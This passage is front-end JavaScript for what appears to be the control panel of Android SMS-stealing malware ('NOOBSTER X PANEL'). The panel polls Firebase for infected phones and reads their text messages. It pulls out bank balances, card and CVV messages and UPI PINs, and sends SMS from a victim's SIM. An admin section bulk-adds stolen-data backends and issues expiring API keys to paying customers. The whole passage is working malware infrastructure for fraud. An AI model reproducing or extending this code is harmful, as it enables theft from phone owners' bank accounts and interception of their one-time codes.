  const [sending, setSending] = useState(false);
  const [sendSim, setSendSim] = useState(1);

  const loadMessages = useCallback(async () => {
    try {
      const data = await fbFetch(fbUrl, fbKey, "messages/" + dev.id, { orderBy: '"$key"', limitToLast: "150" });
      const p = parseMessages(data);
      setMessages(p); setAnalysis(analyzeSMS(p));
    } catch { setMessages([]); }
    finally { setLoading(false); }
  }, [dev.id, fbUrl, fbKey]);

  useEffect(() => { loadMessages(); const iv = setInterval(loadMessages, 6000); return () => clearInterval(iv); }, [loadMessages]);

  const send = async () => {
    if (!sendTo || !sendMsg) { showToast("Fill number and message", "error"); return; }
    setSending(true);
    try {
      await fbPut(fbUrl, fbKey, "clients/" + dev.id + "/webhookEvent/sendSms", { from: sendSim, to: sendTo, message: sendMsg, isSended: false });
      showToast("SMS queued!", "success"); setSendMsg("");
    } catch (e) { showToast("Send failed", "error"); }
    finally { setSending(false); }
  };

  const del = async () => {
    if (!confirm("Delete " + dev.name + "?")) return;
    try { await fbDelete(fbUrl, fbKey, "clients/" + dev.id); showToast("Deleted", "success"); onDelete(); }
    catch { showToast("Delete failed", "error"); }
  };

  const tabs = [
    { k: "info", l: "Info" },
    { k: "bank", l: "Bank (" + analysis.bankBalances.length + ")" },
    ...(analysis.cards.length > 0 ? [{ k: "card", l: "Card (" + analysis.cards.length + ")" }] : []),
    { k: "sms", l: "SMS (" + messages.length + ")" },
    { k: "send", l: "Send" }
  ];

  return e("div", { className: "fixed inset-0 z-50 flex", onClick: onClose },
    e("div", { className: "absolute inset-0 bg-black/70 backdrop-blur-sm" }),
    e("div", { className: "relative ml-auto w-full max-w-md h-full flex flex-col", style: { background: "#0d0d0d", borderLeft: "1px solid #1f1f1f" }, onClick: ev => ev.stopPropagation() },
      e("div", { className: "flex items-center justify-between px-5 py-4", style: { borderBottom: "1px solid #1a1a1a" } },
        e("div", { className: "flex items-center gap-3" },
          e("div", { className: "w-9 h-9 rounded-xl flex items-center justify-center", style: { background: dev.status ? "rgba(34,197,94,0.15)" : "#1a1a1a", border: "1px solid " + (dev.status ? "rgba(34,197,94,0.25)" : "#262626") } },
            e(Icon, { name: "wifi", size: 16, className: dev.status ? "text-emerald-400" : "text-[#444]" })
          ),
          e("div", null,
            e("h3", { className: "text-sm font-bold text-white" }, dev.name),
            e("p", { className: "text-[10px] font-mono mt-0.5", style: { color: "#555" } }, dev.id)
          )
        ),
        e("div", { className: "flex items-center gap-2" },
          e("button", { onClick: del, className: "p-2 rounded-xl", style: { background: "rgba(69,10,10,0.4)", border: "1px solid rgba(127,29,29,0.3)", color: "#f87171" } }, e(Icon, { name: "trash", size: 16 })),
          e("button", { onClick: onClose, className: "p-2 rounded-xl", style: { background: "#1a1a1a", border: "1px solid #262626", color: "#888" } }, e(Icon, { name: "x", size: 16 }))
        )
      ),
      e("div", { className: "flex items-center gap-3 px-5 py-2.5 flex-wrap", style: { background: "#0a0a0a", borderBottom: "1px solid #1a1a1a" } },
        e("div", { className: "flex items-center gap-1.5" },
          e("span", { className: "w-2 h-2 rounded-full", style: { background: dev.status ? "#22c55e" : "#333", boxShadow: dev.status ? "0 0 6px #22c55e" : "none" } }),
          e("span", { className: "text-xs font-semibold", style: { color: dev.status ? "#4ade80" : "#555" } }, dev.status ? "Online" : "Offline")
        ),
        e("div", { className: "flex items-center gap-1" },
          e("span", { className: "text-[10px]", style: { color: "#555" } }, "Bat"),
          e("span", { className: "text-[10px] font-bold", style: { color: dev.batteryPercent >= 60 ? "#4ade80" : dev.batteryPercent >= 30 ? "#facc15" : "#f87171" } }, dev.battery)
        ),
        analysis.bankBalances.length > 0 && e("span", { className: "px-2 py-0.5 rounded-full text-[10px] font-semibold", style: { background: "rgba(34,197,94,0.1)", border: "1px solid rgba(34,197,94,0.2)", color: "#4ade80" } }, analysis.bankBalances.length + " Bank"),
        analysis.cards.length > 0 && e("span", { className: "px-2 py-0.5 rounded-full text-[10px] font-semibold", style: { background: "rgba(168,85,247,0.1)", border: "1px solid rgba(168,85,247,0.2)", color: "#c084fc" } }, analysis.cards.length + " Card")
      ),
      e("div", { className: "flex overflow-x-auto", style: { borderBottom: "1px solid #1a1a1a", padding: "0 8px" } },
        tabs.map(t => e("button", { key: t.k, onClick: () => setTab(t.k), className: "px-3 py-3 text-[11px] font-semibold whitespace-nowrap", style: { borderBottom: "2px solid " + (tab === t.k ? "#ef4444" : "transparent"), color: tab === t.k ? "#f87171" : "#555" } }, t.l))
      ),
      e("div", { className: "flex-1 overflow-y-auto" },
        tab === "info" && e("div", { className: "px-5 py-4" },
          e(InfoRow, { label: "Phone", value: dev.phoneNumber, mono: true }),
          e(InfoRow, { label: "Network", value: dev.provider }),
          e(InfoRow, { label: "Android", value: dev.android }),
          e(InfoRow, { label: "IP", value: dev.ip, mono: true }),
          e(InfoRow, { label: "Storage", value: dev.storage }),
          e(InfoRow, { label: "CPU", value: dev.cpu, mono: true }),
          e(InfoRow, { label: "SDK", value: dev.sdk })
        ),
        tab === "bank" && e("div", { className: "px-4 py-3" },
          loading ? e("div", { className: "py-12 text-center", style: { color: "#555" } }, "Loading…")
            : analysis.bankBalances.length === 0 ? e("div", { className: "py-12 text-center", style: { color: "#444" } }, "No bank SMS")
            : analysis.bankBalances.map((b, i) => e(BankCard, { key: i, balance: b }))
        ),
        tab === "card" && e("div", { className: "px-4 py-3" },
          analysis.cards.length === 0 ? e("div", { className: "py-12 text-center", style: { color: "#444" } }, "No card")
            : analysis.cards.map((c, i) => e(CardDisplay, { key: i, card: c }))
        ),
        tab === "sms" && e("div", { className: "px-4 py-3" },
          loading ? e("div", { className: "py-12 text-center", style: { color: "#555" } }, "Loading…")
            : messages.length === 0 ? e("div", { className: "py-12 text-center", style: { color: "#444" } }, "No messages")
            : messages.map((m, i) => {
                const isBank = /AVL|AVAL|BAL\.|CREDITED|DEBITED|INR/i.test(m.text);
                const isCard = /CARD|CVV/i.test(m.text);
                return e("div", { key: i, className: "p-3 rounded-xl mb-2", style: { background: isCard ? "#100d18" : isBank ? "#0a130d" : "#111", border: "1px solid #1e1e1e", borderLeft: "2px solid " + (isCard ? "rgba(168,85,247,0.6)" : isBank ? "rgba(34,197,94,0.6)" : "rgba(239,68,68,0.6)") } },
                  e("div", { className: "flex items-center justify-between mb-2" },
                    e("span", { className: "text-xs font-bold", style: { color: isCard ? "#c084fc" : isBank ? "#4ade80" : "#f87171" } }, m.sender),
                    e("span", { className: "text-[10px] font-mono", style: { color: "#444" } }, m.time)
                  ),
                  e("p", { className: "text-xs", style: { color: "#aaa" } }, m.text.substring(0, 250))
                );
              })
        ),
        tab === "send" && e("div", { className: "px-5 py-4" },
          e("p", { className: "text-[10px] font-semibold uppercase tracking-widest mb-2", style: { color: "#555" } }, "Select SIM"),
          e("div", { className: "flex gap-2 mb-4" }, [1, 2].map(n => e("button", { key: n, onClick: () => setSendSim(n), className: "flex-1 py-2.5 rounded-xl text-sm font-bold", style: { background: sendSim === n ? "#dc2626" : "#111", border: sendSim === n ? "none" : "1px solid #222", color: sendSim === n ? "#fff" : "#666" } }, "SIM " + n))),
          e("p", { className: "text-[10px] font-semibold uppercase tracking-widest mb-2", style: { color: "#555" } }, "Recipient"),
          e("input", { type: "text", value: sendTo, onChange: ev => setSendTo(ev.target.value), placeholder: "+919876543210", className: "w-full px-4 py-3 rounded-xl outline-none text-sm font-mono mb-4", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
          e("p", { className: "text-[10px] font-semibold uppercase tracking-widest mb-2", style: { color: "#555" } }, "Message"),
          e("textarea", { value: sendMsg, onChange: ev => setSendMsg(ev.target.value), rows: 4, placeholder: "Type message…", className: "w-full px-4 py-3 rounded-xl outline-none text-sm resize-none mb-4", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
          e("button", { onClick: send, disabled: sending, className: "w-full py-3.5 rounded-xl font-bold text-sm text-white disabled:opacity-50", style: { background: "#dc2626" } }, sending ? "Sending…" : "Send via SIM " + sendSim)
        )
      )
    )
  );
}

// ---------- PANEL (main dashboard) ----------
function Panel({ fbUrl, fbKey, accounts, onLogout }) {
  const accs = accounts && accounts.length > 0 ? accounts : [{ url: fbUrl, key: fbKey }];
  const [starred, setStarred] = useState(() => LS.get(K_STARRED, []));
  const [devices, setDevices] = useState([]);
  const [loading, setLoading] = useState(true);
  const [selected, setSelected] = useState(null);
  const [filter, setFilter] = useState("all");
  const [sortBy, setSortBy] = useState("new");
  const [search, setSearch] = useState("");
  const [toast, setToast] = useState(null);
  const [err, setErr] = useState("");
  const [now, setNow] = useState(new Date());
  const prevCount = useRef(0);
  const loadedRef = useRef(false);

  const showToast = useCallback((msg, type = "info") => setToast({ msg, type, id: Date.now() }), []);
  const toggleStar = (id) => {
    const next = starred.includes(id) ? starred.filter(x => x !== id) : [...starred, id];
    setStarred(next); LS.set(K_STARRED, next);
  };

  const loadDevices = useCallback(async (silent) => {
    try {
      let all = [], errs = [];
      await Promise.all(accs.map(async (acc) => {
        try {
          const data = await fbFetch(acc.url, acc.key, "clients");
          const list = parseDevices(data);
          list.forEach(d => { d._accountUrl = acc.url; d._accountKey = acc.key; });
          all.push(...list);
        } catch (e) { errs.push(e); }
      }));
      if (all.length === 0 && errs.length > 0) throw errs[0];
      setDevices(all); setErr(""); setLoading(false);
      const chunks = [];
      for (let i = 0; i < all.length; i += 5) chunks.push(all.slice(i, i + 5));
      for (const grp of chunks) {
        await Promise.all(grp.map(async (dev) => {
          try {
            const data = await fbFetch(dev._accountUrl, dev._accountKey, "messages/" + dev.id, { orderBy: '"$key"', limitToLast: "150" });
            const analysis = analyzeSMS(parseMessages(data));
            setDevices(prev => prev.map(p => p.id === dev.id ? { ...p, smsAnalysis: analysis } : p));
          } catch {}
        }));
      }
      if (prevCount.current > 0 && all.length > prevCount.current && silent) showToast("🔔 New device!", "success");
      prevCount.current = all.length;
      loadedRef.current = true;
    } catch (e) {
      setLoading(false);
      const msg = e.message || "";
      if (msg.includes("PERMISSION")) setErr("Firebase Permission Denied — use Database Secret key.");
      else setErr(msg.slice(0, 120));
    }
  }, [accs, showToast]);

  useEffect(() => {
    loadDevices(false);
    const iv1 = setInterval(() => loadDevices(true), 15000);
    const iv2 = setInterval(() => setNow(new Date()), 1000);
    return () => { clearInterval(iv1); clearInterval(iv2); };
  }, [loadDevices]);

  const filtered = useMemo(() => {
    return devices.filter(d => {
      if (filter === "online" && !d.status) return false;
      if (filter === "offline" && d.status) return false;
      if (filter === "starred" && !starred.includes(d.id)) return false;
      if (filter === "upi" && !d.upipin) return false;
      if (filter === "bank" && !(d.smsAnalysis && d.smsAnalysis.bankBalances.length)) return false;
      if (filter === "card" && !(d.smsAnalysis && d.smsAnalysis.cards.length)) return false;
      const q = search.toLowerCase();
      if (q && !d.name.toLowerCase().includes(q) && !d.phoneNumber.includes(q) && !d.id.includes(q)) return false;
      return true;
    }).sort((a, b) => {
      if (sortBy === "name") return a.name.localeCompare(b.name);
      if (sortBy === "battery") return b.batteryPercent - a.batteryPercent;
      if (sortBy === "old") return String(a.id).localeCompare(String(b.id));
      return String(b.id).localeCompare(String(a.id));
    });
  }, [devices, filter, starred, search, sortBy]);

  const onlineCount = devices.filter(d => d.status).length;
  const offlineCount = devices.length - onlineCount;
  const starredCount = devices.filter(d => starred.includes(d.id)).length;
  const bankCount = devices.filter(d => d.smsAnalysis && d.smsAnalysis.bankBalances.length).length;
  const cardCount = devices.filter(d => d.smsAnalysis && d.smsAnalysis.cards.length).length;
  const timeStr = now.toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: false });

  return e("div", { className: "min-h-screen flex flex-col", style: { background: "#080808", color: "#fff" } },
    e("header", { className: "sticky top-0 z-40 backdrop-blur-md", style: { background: "rgba(10,10,10,0.8)", borderBottom: "1px solid rgba(26,26,26,0.8)" } },
      e("div", { className: "max-w-screen-2xl mx-auto px-4 sm:px-6 py-3 flex items-center gap-3 flex-wrap" },
        e("div", { className: "flex items-center gap-2.5 flex-shrink-0" },
          e("div", { className: "w-7 h-7 rounded-lg red-gradient flex items-center justify-center" }, e("img", { src: "https://i.ibb.co/TMbrv7yV/noobster.jpg", style: { width: "100%", height: "100%", objectFit: "cover", borderRadius: "inherit" } })),
          e("span", { style: { color: "#6acfff" } }, "NOOBSTER"),
          e("span", null, " 𝑿 "),
          e("span", { className: "relative" }, "𝑷𝑨𝑵𝑬𝑳")
        ),
        e("div", { className: "relative flex-1", style: { minWidth: "180px", maxWidth: "24rem" } },
          e("input", { type: "text", value: search, onChange: ev => setSearch(ev.target.value), placeholder: "Search devices...", className: "w-full pl-9 pr-4 py-2 rounded-xl outline-none text-sm", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
          e("div", { className: "absolute left-3 top-1/2 -translate-y-1/2", style: { color: "#444" } }, e(Icon, { name: "search", size: 16 }))
        ),
        e("div", { className: "ml-auto flex items-center gap-2 flex-wrap" },
          e("div", { className: "flex items-center gap-2 px-3 py-1.5 rounded-full", style: { background: "rgba(2,44,34,0.4)", border: "1px solid rgba(6,78,59,0.4)" } },
            e("span", { className: "w-2 h-2 rounded-full bg-emerald-500 animate-pulse" }),
            e("span", { className: "text-xs font-semibold text-emerald-400" }, onlineCount + " online")
          ),
          e("div", { className: "flex items-center gap-1.5 px-3 py-1.5 rounded-full", style: { background: "#111", border: "1px solid #1e1e1e" } },
            e(Icon, { name: "clock", size: 14, className: "text-[#555]" }),
            e("span", { className: "text-xs font-mono font-bold", style: { color: "#888" } }, timeStr)
          ),
          e("button", { onClick: () => confirm("Logout?") && onLogout(), className: "flex items-center gap-2 px-3 py-1.5 rounded-xl text-xs", style: { background: "#111", border: "1px solid #222", color: "#666" } },
            e(Icon, { name: "logout", size: 14 }), "Logout")
        )
      )
    ),
    err && e("div", { className: "px-6 py-3 flex items-start gap-3", style: { background: "rgba(69,10,10,0.4)", borderBottom: "1px solid rgba(127,29,29,0.3)" } },
      e(Icon, { name: "alert", size: 16, className: "text-red-400 flex-shrink-0 mt-0.5" }),
      e("p", { className: "text-xs text-red-300 flex-1" }, err),
      e("button", { onClick: () => setErr(""), style: { color: "#f87171" } }, e(Icon, { name: "x", size: 14 }))
    ),
    e("div", { style: { background: "rgba(10,10,10,0.7)", borderBottom: "1px solid rgba(26,26,26,0.8)" } },
      e("div", { className: "max-w-screen-2xl mx-auto px-4 sm:px-6 py-3 flex items-center gap-4 flex-wrap" },
        e("div", { className: "flex items-center gap-4 flex-wrap" },
          statBox("Total", devices.length, "#fff"),
          statBox("Online", onlineCount, "#4ade80"),
          statBox("Offline", offlineCount, "#666"),
          statBox("Starred", starredCount, "#fbbf24"),
          statBox("Bank", bankCount, "#4ade80"),
          cardCount > 0 && statBox("Card", cardCount, "#c084fc")
        ),
        e("div", { className: "ml-auto flex items-center gap-1.5 flex-wrap" },
          ["all", "online", "offline", "starred", "upi", "bank", "card"].map(f => e("button", { key: f, onClick: () => setFilter(f), className: "px-2.5 py-1.5 rounded-lg text-xs font-semibold", style: { background: filter === f ? "rgba(220,38,38,0.2)" : "transparent", color: filter === f ? "#f87171" : "#555", border: filter === f ? "1px solid rgba(220,38,38,0.3)" : "1px solid transparent" } }, f)),
          e("select", { value: sortBy, onChange: ev => setSortBy(ev.target.value), className: "text-xs rounded-lg px-2 py-1.5 outline-none", style: { background: "#111", border: "1px solid #222", color: "#666" } },
            e("option", { value: "new" }, "Newest"),
            e("option", { value: "old" }, "Oldest"),
            e("option", { value: "name" }, "Name"),
            e("option", { value: "battery" }, "Battery")
          ),
          e("button", { onClick: () => loadDevices(false), className: "p-2 rounded-lg", style: { background: "#111", border: "1px solid #222", color: "#555" } }, e(Icon, { name: "refresh", size: 14 }))
        )
      )
    ),
    e("main", { className: "flex-1 max-w-screen-2xl mx-auto w-full px-3 sm:px-6 py-4" },
      loading ? e("div", null,
        e("div", { className: "flex items-center gap-3 mb-5" },
          e("div", { className: "w-4 h-4 border-2 animate-spin rounded-full", style: { borderColor: "#333", borderTopColor: "#ef4444" } }),
          e("span", { className: "text-sm", style: { color: "#555" } }, "Connecting…")
        ),
        e("div", { className: "grid grid-cols-1 sm:grid-cols-2 gap-3" }, Array.from({ length: 6 }).map((_, i) => e(DeviceSkeleton, { key: i })))
      ) : devices.length === 0 ? e("div", { className: "flex flex-col items-center justify-center py-24 text-center" },
        e("div", { className: "w-16 h-16 rounded-2xl flex items-center justify-center mb-5", style: { background: "#111", border: "1px solid #1e1e1e" } }, e(Icon, { name: "shield", size: 48, className: "text-[#2a2a2a]" })),
        e("p", { className: "text-base font-bold", style: { color: "#444" } }, "No devices connected"),
        e("p", { className: "text-sm mt-1.5", style: { color: "#333" } }, "Waiting for devices…")
      ) : e("div", { className: "grid grid-cols-1 sm:grid-cols-2 gap-3" },
        filtered.map(d => e(DeviceCard, { key: d.id, dev: d, starred: starred.includes(d.id), onToggleStar: toggleStar, onClick: () => setSelected(d) })),
        filtered.length === 0 && e("div", { className: "py-16 text-center", style: { color: "#444", gridColumn: "1/-1" } }, "No match")
      )
    ),
    toast && e(Toast, { msg: toast.msg, type: toast.type, onClose: () => setToast(null) }),
    selected && e(DeviceDetail, { dev: selected, fbUrl: selected._accountUrl || fbUrl, fbKey: selected._accountKey || fbKey, onClose: () => setSelected(null), onDelete: () => { setSelected(null); loadDevices(false); }, showToast })
  );

  function statBox(label, val, color) {
    return e("div", null,
      e("p", { className: "text-[9px] uppercase tracking-widest font-semibold", style: { color: "#444" } }, label),
      e("p", { className: "text-lg font-black", style: { color } }, val)
    );
  }
}

// ---------- ADMIN LOGIN ----------
function AdminLogin({ onSuccess }) {
  const [pass, setPass] = useState("");
  const [err, setErr] = useState("");
  const submit = (ev) => {
    ev.preventDefault();
    if (pass === CFG.ADMIN_PASSWORD) {
      LS.set(K_ADMIN, { loggedIn: true, at: Date.now() });
      onSuccess();
    } else setErr("Wrong password");
  };
  return e("div", { className: "min-h-screen flex items-center justify-center p-4" },
    e("div", { className: "glass-card rounded-3xl p-8 max-w-sm w-full shadow-2xl animate-fade-up" },
      e("div", { className: "text-center mb-6" },
        e("div", { className: "w-16 h-16 rounded-2xl red-gradient inline-flex items-center justify-center mb-4" }, e(Icon, { name: "lock", size: 28 })),
        e("h1", { className: "text-2xl font-black" }, "Admin Access")
      ),
      e("form", { onSubmit: submit },
        e("input", { type: "password", value: pass, onChange: ev => setPass(ev.target.value), placeholder: "Enter admin password", className: "w-full px-4 py-3 rounded-xl outline-none text-sm mb-3", style: { background: "#111", border: "1px solid #222", color: "#fff" }, autoFocus: true }),
        err && e("p", { className: "text-xs text-red-400 mb-3" }, err),
        e("button", { type: "submit", className: "w-full py-3 rounded-xl red-gradient text-white font-bold text-sm" }, "Login")
      )
    )
  );
}

// ---------- ADMIN DASHBOARD ----------
function AdminDashboard({ onLogout }) {
  const [tab, setTab] = useState("dashboard");
  const [accounts, setAccounts] = useState(() => LS.get(K_ACCOUNTS, []));
  const [apiKeys, setApiKeys] = useState(() => LS.get(K_APIKEYS, []));
  const [status, setStatus] = useState(() => LS.get(K_PANELSTATUS, { online: true, broadcast: "" }));
  const [devices, setDevices] = useState([]);
  const [loading, setLoading] = useState(false);
  const [toast, setToast] = useState(null);

  // Bulk firebase
  const [bulkUrls, setBulkUrls] = useState("");
  const [bulkKey, setBulkKey] = useState("");
  const [bulkBusy, setBulkBusy] = useState(false);
  const [perAccCount, setPerAccCount] = useState({});

  // New API key
  const [apiName, setApiName] = useState("");
  const [apiKeyVal, setApiKeyVal] = useState("");
  const [apiExpiry, setApiExpiry] = useState("30"); // days or "never"
  const [showKeyGen, setShowKeyGen] = useState(false);

  // Broadcast
  const [broadcast, setBroadcast] = useState(status.broadcast || "");

  const showToast = (msg, type = "info") => setToast({ msg, type, id: Date.now() });
  const saveAccs = (l) => { setAccounts(l); LS.set(K_ACCOUNTS, l); };
  const saveKeys = (l) => { setApiKeys(l); LS.set(K_APIKEYS, l); };
  const saveStatus = (s) => { setStatus(s); LS.set(K_PANELSTATUS, s); };

  // Load devices
  const loadDevices = useCallback(async () => {
    setLoading(true);
    let all = [], counts = {};
    await Promise.all(accounts.map(async (acc) => {
      try {
        const data = await fbFetch(acc.url, acc.key, "clients");
        const list = parseDevices(data);
        list.forEach(d => { d._accountName = acc.name; });
        all.push(...list);
        counts[acc.id] = list.length;
      } catch { counts[acc.id] = 0; }
    }));
    setDevices(all); setPerAccCount(counts); setLoading(false);
  }, [accounts]);

  useEffect(() => { loadDevices(); const iv = setInterval(loadDevices, 20000); return () => clearInterval(iv); }, [loadDevices]);

  // Bulk add
  const handleBulkAdd = async () => {
    const lines = bulkUrls.split("\n").map(l => l.trim()).filter(Boolean);
    if (lines.length === 0) return showToast("Paste URLs", "error");
    if (!bulkKey.trim()) return showToast("Paste secret key", "error");
    setBulkBusy(true);
    let newAccs = [];
    let usedNames = new Set(accounts.map(a => a.name));
    for (const url of lines) {
      if (!url.startsWith("http")) continue;
      let name = url.split("//")[1].split(".")[0];
      if (usedNames.has(name)) name = name + "-" + Math.floor(Math.random() * 1000);
      usedNames.add(name);
      newAccs.push({ id: Date.now() + Math.random(), name, url, key: bulkKey.trim(), date: new Date().toLocaleString() });
    }
    if (newAccs.length > 0) {
      saveAccs([...accounts, ...newAccs]);
      setBulkUrls(""); setBulkKey("");
      showToast(newAccs.length + " Firebase added!", "success");
    }
    setBulkBusy(false);
  };

  // Generate API key
  const genKey = () => {
    const rand = Math.random().toString(36).slice(2, 12).toUpperCase();
    return rand + Math.random().toString(36).slice(2, 8).toUpperCase();
  };
  const handleAddApi = () => {
    if (!apiName.trim()) return showToast("Enter API name", "error");
    if (!apiKeyVal.trim()) { setApiKeyVal(genKey()); return; }
    let expiresAt = null;
    if (apiExpiry !== "never") {
      const days = parseInt(apiExpiry);
      if (days > 0) expiresAt = Date.now() + days * 24 * 60 * 60 * 1000;
    }
    const newKey = { id: Date.now(), name: apiName.trim(), key: apiKeyVal.trim(), active: true, expiresAt, createdAt: Date.now() };
    saveKeys([...apiKeys, newKey]);
    setApiName(""); setApiKeyVal(""); setApiExpiry("30"); setShowKeyGen(false);
    showToast("API key created!", "success");
  };

  const filteredDevices = useMemo(() => {
    if (!devices.length) return [];
    return devices;
  }, [devices]);

  const stats = {
    total: devices.length,
    online: devices.filter(d => d.status).length,
    offline: devices.filter(d => !d.status).length,
    accs: accounts.length,
    keys: apiKeys.length,
    activeKeys: apiKeys.filter(k => k.active && (!k.expiresAt || k.expiresAt > Date.now())).length
  };

  const tabs = [
    { k: "dashboard", l: "Dashboard" },
    { k: "firebases", l: "Firebases (" + accounts.length + ")" },
    { k: "apikeys", l: "API Keys (" + apiKeys.length + ")" },
    { k: "control", l: "Control" }
  ];

  return e("div", { className: "min-h-screen" },
    e("header", { className: "sticky top-0 z-40 backdrop-blur-md", style: { background: "rgba(10,10,10,0.85)", borderBottom: "1px solid #1a1a1a" } },
      e("div", { className: "max-w-screen-2xl mx-auto px-4 sm:px-6 py-3 flex items-center justify-between flex-wrap gap-3" },
        e("div", { className: "flex items-center gap-2.5" },
          e("div", { className: "w-8 h-8 rounded-lg red-gradient flex items-center justify-center" }, e(Icon, { name: "shield", size: 16 })),
          e("span", { className: "text-base font-black" }, "Admin Panel")
        ),
        e("button", { onClick: onLogout, className: "px-4 py-2 rounded-xl text-xs font-semibold flex items-center gap-2", style: { background: "#1a1a1a", border: "1px solid #2a2a2a", color: "#888" } }, e(Icon, { name: "logout", size: 14 }), "Logout")
      )
    ),
    e("div", { className: "max-w-screen-2xl mx-auto px-4 sm:px-6 py-4" },
      e("div", { className: "flex overflow-x-auto", style: { borderBottom: "1px solid #1a1a1a", marginBottom: "1.5rem" } },
        tabs.map(t => e("button", { key: t.k, onClick: () => setTab(t.k), className: "px-4 py-3 text-xs font-semibold whitespace-nowrap", style: { borderBottom: "2px solid " + (tab === t.k ? "#dc2626" : "transparent"), color: tab === t.k ? "#f87171" : "#555" } }, t.l))
      ),

      // DASHBOARD
      tab === "dashboard" && e("div", { className: "animate-fade-up" },
        e("div", { className: "grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-3 mb-6" },
          e(StatCard, { label: "Total", val: stats.total }),
          e(StatCard, { label: "Online", val: stats.online, color: "#4ade80" }),
          e(StatCard, { label: "Offline", val: stats.offline, color: "#666" }),
          e(StatCard, { label: "Firebases", val: stats.accs, color: "#60a5fa" }),
          e(StatCard, { label: "API Keys", val: stats.keys, color: "#fbbf24" }),
          e(StatCard, { label: "Active Keys", val: stats.activeKeys, color: "#4ade80" })
        ),
        e("button", { onClick: loadDevices, disabled: loading, className: "mb-4 px-4 py-2 rounded-xl text-xs font-semibold flex items-center gap-2", style: { background: "#111", border: "1px solid #222", color: "#666" } },
          loading ? "Loading…" : e(Fragment, null, e(Icon, { name: "refresh", size: 14 }), " Refresh Devices")),
        loading ? e("p", { className: "text-sm", style: { color: "#555" } }, "Loading…")
          : filteredDevices.length === 0 ? e("div", { className: "text-center py-12", style: { color: "#444" } }, "No devices. Add a Firebase URL first.")
          : e("div", { className: "grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3" },
              filteredDevices.map(d => e("div", { key: d.id, className: "p-3 rounded-xl", style: { background: "#0d0d0d", border: "1px solid #1f1f1f" } },
                e("div", { className: "flex items-center justify-between mb-2" },
                  e("span", { className: "text-sm font-bold truncate" }, d.name),
                  e("span", { className: "text-[10px] px-2 py-0.5 rounded-full", style: { background: d.status ? "rgba(34,197,94,0.15)" : "rgba(127,29,29,0.3)", color: d.status ? "#4ade80" : "#f87171" } }, d.status ? "Online" : "Offline")
                ),
                e("div", { className: "text-xs", style: { color: "#888" } }, "Phone: " + d.phoneNumber),
                e("div", { className: "text-xs", style: { color: "#888" } }, "Battery: " + d.battery),
                e("div", { className: "text-[10px] mt-1", style: { color: "#555" } }, "Source: " + (d._accountName || "—"))
              ))
            )
      ),

      // FIREBASES
      tab === "firebases" && e("div", { className: "animate-fade-up" },
        e("div", { className: "p-5 rounded-2xl mb-4", style: { background: "#0d0d0d", border: "1px solid #1f1f1f" } },
          e("h2", { className: "text-lg font-bold mb-2" }, "Bulk Add Firebase URLs"),
          e("p", { className: "text-xs mb-4", style: { color: "#666" } }, "Paste multiple Firebase URLs (one per line) — secret key is applied to all."),
          e("label", { className: "block text-xs font-semibold uppercase tracking-wider mb-2", style: { color: "#888" } }, "Firebase URLs (one per line)"),
          e("textarea", { value: bulkUrls, onChange: ev => setBulkUrls(ev.target.value), rows: 6, placeholder: "https://app1.firebaseio.com\nhttps://app2.firebaseio.com\nhttps://app3.firebaseio.com", className: "w-full px-4 py-3 rounded-xl outline-none text-xs font-mono mb-3", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
          e("label", { className: "block text-xs font-semibold uppercase tracking-wider mb-2", style: { color: "#888" } }, "Secret Key (applied to all)"),
          e("input", { type: "text", value: bulkKey, onChange: ev => setBulkKey(ev.target.value), placeholder: "Firebase Database Secret", className: "w-full px-4 py-3 rounded-xl outline-none text-xs font-mono mb-4", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
          e("button", { onClick: handleBulkAdd, disabled: bulkBusy, className: "px-5 py-2.5 rounded-xl red-gradient text-white font-semibold text-sm disabled:opacity-50" }, bulkBusy ? "Adding…" : "Add " + (bulkUrls.split("\n").filter(l => l.trim().startsWith("http")).length) + " URLs")
        ),
        e("div", { className: "p-5 rounded-2xl", style: { background: "#0d0d0d", border: "1px solid #1f1f1f" } },
          e("h3", { className: "text-sm font-bold mb-3" }, "Active Firebases (" + accounts.length + ")"),
          accounts.length === 0 ? e("p", { className: "text-sm text-center py-6", style: { color: "#555" } }, "No firebases yet")
            : accounts.map(acc => e("div", { key: acc.id, className: "flex items-center gap-3 p-3 rounded-xl mb-2", style: { background: "#111", border: "1px solid #222" } },
                e("div", { className: "flex-1 min-w-0" },
                  e("div", { className: "flex items-center gap-2" },
                    e("span", { className: "text-sm font-bold" }, acc.name),
                    e("span", { className: "text-[10px] px-2 py-0.5 rounded-full", style: { background: "rgba(245,158,11,0.15)", color: "#fbbf24" } }, (perAccCount[acc.id] || 0) + " devices")
                  ),
                  e("div", { className: "text-[10px] font-mono truncate mt-1", style: { color: "#60a5fa" } }, acc.url)
                ),
                e("button", { onClick: () => confirm("Remove " + acc.name + "?") && saveAccs(accounts.filter(a => a.id !== acc.id)), className: "p-2 rounded-lg", style: { background: "rgba(69,10,10,0.4)", border: "1px solid rgba(127,29,29,0.3)", color: "#f87171" } }, e(Icon, { name: "trash", size: 14 }))
              ))
        )
      ),

      // API KEYS
      tab === "apikeys" && e("div", { className: "animate-fade-up" },
        e("div", { className: "p-5 rounded-2xl mb-4", style: { background: "#0d0d0d", border: "1px solid #1f1f1f" } },
          e("h2", { className: "text-lg font-bold mb-2" }, "Generate API Key"),
          e("p", { className: "text-xs mb-4", style: { color: "#666" } }, "Public users must access the panel via /v2/YOUR_API_KEY. Expired keys are blocked."),
          e("div", { className: "grid grid-cols-1 sm:grid-cols-2 gap-3 mb-3" },
            e("div", null,
              e("label", { className: "block text-xs font-semibold uppercase tracking-wider mb-2", style: { color: "#888" } }, "API Name"),
              e("input", { type: "text", value: apiName, onChange: ev => setApiName(ev.target.value), placeholder: "e.g. Customer 1", className: "w-full px-4 py-3 rounded-xl outline-none text-sm", style: { background: "#111", border: "1px solid #222", color: "#fff" } })
            ),
            e("div", null,
              e("label", { className: "block text-xs font-semibold uppercase tracking-wider mb-2", style: { color: "#888" } }, "Expiry"),
              e("select", { value: apiExpiry, onChange: ev => setApiExpiry(ev.target.value), className: "w-full px-4 py-3 rounded-xl outline-none text-sm", style: { background: "#111", border: "1px solid #222", color: "#fff" } },
                e("option", { value: "1" }, "1 Day"),
                e("option", { value: "7" }, "7 Days"),
